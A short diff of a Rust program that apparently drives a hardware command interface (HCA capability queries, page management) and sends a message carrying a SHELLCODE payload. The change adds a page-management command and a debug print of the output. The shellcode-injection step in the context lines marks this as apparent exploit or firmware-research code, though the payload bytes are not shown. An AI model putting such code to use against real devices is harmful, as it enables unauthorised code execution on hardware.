@@ -61,6 +61,7 @@ fn main() -> Result<()> {
         input_num_entries: query_boot_pages.num_pages as u32,
         items: pages,
     };
+    cmdif.do_command(manage_pages_cmd)?;
 
     let query_hca_cap = cmdif.exec_command(
         &[
@@ -96,6 +97,7 @@ fn main() -> Result<()> {
     msg.extend_from_slice(SHELLCODE);
     msg.resize(0x100, 0u8);
     let output = cmdif.exec_command(&msg, 0x100)?;
+    dbg!(output);
 
     Ok(())
 }
